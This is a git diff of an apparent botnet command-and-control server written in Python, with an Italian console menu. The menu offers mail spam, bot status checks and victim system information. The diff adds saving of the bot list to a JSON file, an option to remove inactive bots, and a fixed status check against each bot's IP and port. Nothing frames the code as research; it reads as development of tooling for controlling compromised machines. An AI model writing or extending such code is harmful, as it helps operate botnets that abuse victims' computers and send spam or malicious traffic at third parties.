@@ -13,17 +13,20 @@ clients = []
 
 def write_on_json_file():
     with open("bot-db.json", "w") as f:
-        print(clients)
+        if len(clients) == 0:
+            f.write("")
+            return
         json.dump(clients, f)
 
 
 def initialize_bot_list():
     with open("bot-db.json", "r") as f:
-        if data := json.load(f):
-            for client in data:
-                print(client)
-                if check_bot_is_active(client):
-                    clients.append((client[0], client[1]))
+        if data := f.read():
+            bots = json.loads(data)
+            for bot in bots:
+                if check_bot_is_active(bot):
+                    clients.append((bot[0], bot[1]))
+    write_on_json_file()
 
 
 def initialize(e):
@@ -35,7 +38,7 @@ def initialize(e):
     s.listen(5)
     s.settimeout(2)
 
-    # initialize_bot_list()
+    initialize_bot_list()
 
     while not e.is_set():
         try:
@@ -48,6 +51,7 @@ def initialize(e):
 
             if bot not in clients:
                 clients.append(bot)
+                write_on_json_file()
 
         except socket.timeout:
             continue
@@ -80,6 +84,7 @@ def handle_console(e):
         print("4. Mostra informazioni di un client")
         print("5. Avvia mail spam")
         print("6. Controlla lo stato dei bot")
+        print("7. Rimuovi tutti i bot inattivi")
         print("0. Exit")
         scelta = int(input())
 
@@ -100,6 +105,8 @@ def handle_console(e):
             mail_spam()
         elif scelta == 6:
             bot_status()
+        elif scelta == 7:
+            rimuovi_bot_inattivi()
         else:
             print("Scelta non valida")
 
@@ -148,13 +155,9 @@ def send_http_request():
 def print_client_info(client, res):
     print(f"Client Ip: {client}")
     print(f"CPU: {res.json()['cpu']}")
-    print(f"CPU usage: {res.json()['cpu_usage']}%")
-    print(f"RAM (GB): {res.json()['ram']}")
-    print(f"RAM usage: {res.json()['ram_usage']}%")
+    print(f"Machine: {res.json()['machine']}")
+    print(f"Platform: {res.json()['platform']}")
     print(f"System: {res.json()['system']}")
-    print(f"Cores: {res.json()['cores']}")
-    print(f"Total Cores: {res.json()['total_cores']}")
-    print(f"Users: {res.json()['users']}")
     print("--------------------")
 
 
@@ -226,10 +229,20 @@ def bot_status():
             clients.remove(client)
 
 
-def check_bot_is_active(client):
+def rimuovi_bot_inattivi():
+    """
+    Remove all the inactive bots
+    """
+    for client in clients:
+        if not check_bot_is_active(client):
+            print(f"Bot {client} disconnesso")
+            clients.remove(client)
+    write_on_json_file()
+
+def check_bot_is_active(bot):
     try:
-        requests.get(f"http://{client}/status")
-        return True
+        res = requests.get(f"http://{bot[0]}:{bot[1]}/status")
+        return res.status_code == 200
     except requests.exceptions.ConnectionError:
         return False
 
